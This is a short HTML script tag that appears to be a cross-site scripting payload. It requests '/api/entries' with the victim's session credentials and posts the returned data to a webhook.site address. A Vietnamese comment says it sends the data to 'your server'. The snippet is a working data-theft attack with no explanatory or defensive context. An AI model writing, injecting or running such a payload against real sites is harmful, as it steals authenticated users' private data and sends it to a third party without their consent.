<script>
  fetch('/api/entries', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Gửi data đến server của bạn
    fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
